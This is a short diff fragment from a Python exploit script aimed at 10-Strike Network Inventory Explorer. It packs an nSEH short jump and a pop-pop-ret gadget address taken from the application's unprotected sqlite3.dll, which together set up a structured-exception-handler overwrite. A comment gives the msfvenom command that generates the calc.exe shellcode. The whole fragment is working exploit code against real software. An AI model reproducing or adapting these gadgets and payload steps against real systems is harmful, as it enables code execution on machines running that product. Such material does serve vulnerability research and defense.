@@ -119,7 +119,6 @@ import struct
 
 nseh = struct.pack("<I", 0x909006EB)
 seh = struct.pack("<I", 0x61E8497A) # 0x61e8497a : pop esi # pop edi # ret  |  {PAGE_EXECUTE_READ} [sqlite3.dll] ASLR: False, Rebase: 
-
 False, SafeSEH: False, OS: False, v3.12.2 (C:\Program Files\10-Strike Network Inventory Explorer\sqlite3.dll)
 
 # msfvenom -p windows/exec CMD=calc.exe -f py -e x86/alpha_mixed 
